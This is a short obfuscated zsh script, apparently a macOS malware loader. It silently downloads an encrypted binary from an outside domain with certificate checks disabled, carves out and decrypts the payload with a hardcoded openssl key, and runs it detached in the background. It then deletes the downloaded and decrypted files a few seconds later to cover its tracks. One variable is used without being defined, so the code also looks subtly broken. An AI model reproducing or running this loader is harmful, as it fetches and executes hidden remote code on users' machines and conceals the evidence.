#!/bin/zsh
az5cc=$(mktemp /tmp/abbz48.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mdafdbdf128c18c02.bin" -o "$az5ccz" || exit 1
zypy4h=$(stat -f %z "$az5ccz"); knsj2ax=$(( zypy4h - 3866 - 277 ))
tail -c +$(( 3866 + 1 )) "$az5ccz" | head -c $knsj2ax | openssl enc -d -aes-256-cbc -k 0228efc18b4cc91f833d1063 -out "$az5cc" 2>/dev/null
[ -s "$az5cc" ] && chmod 700 "$az5cc" && ( "$az5cc" & ) && disown
( sleep 3; rm -f "$az5cc" "$az5ccz" ) &>/dev/null &
